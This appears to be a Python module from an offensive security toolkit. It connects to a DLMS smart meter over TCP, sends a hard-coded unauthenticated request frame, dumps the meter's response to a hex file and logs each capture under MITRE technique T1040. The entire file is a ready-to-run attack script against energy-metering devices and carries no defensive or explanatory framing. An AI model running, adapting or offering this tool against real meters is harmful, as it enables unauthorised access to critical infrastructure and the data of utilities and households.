# modules/attacks/dlms_screenshot_grabber.py

import socket
import argparse
import json
import os
import time
from datetime import datetime

LOG_FILE = "results/dlms_screenshot_log.json"
MITRE_TTP = "T1040"

def log_capture(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def grab_dlms_frame(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))

        s.sendall(bytes.fromhex("7EA00A0100010000000000007E"))  # DLMS GET-REQUEST frame (non-secure)
        time.sleep(1)
        data = s.recv(2048)

        hex_data = data.hex()
        raw_file = f"results/dlms_screen_{int(time.time())}.hex"
        with open(raw_file, "w") as f:
            f.write(hex_data)

        log_capture({
            "timestamp": datetime.utcnow().isoformat(),
            "target": f"{ip}:{port}",
            "dump_file": raw_file,
            "ttp": MITRE_TTP
        })

        print(f"[+] Data saved to {raw_file}")
        return True
    except Exception as e:
        print(f"[!] Error capturing DLMS: {e}")
        return False
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DLMS Pseudo-Screenshot Grabber")
    parser.add_argument("--ip", required=True, help="Target DLMS smart meter IP")
    parser.add_argument("--port", type=int, default=4059, help="TCP Port (default: 4059)")
    args = parser.parse_args()

    grab_dlms_frame(args.ip, args.port)
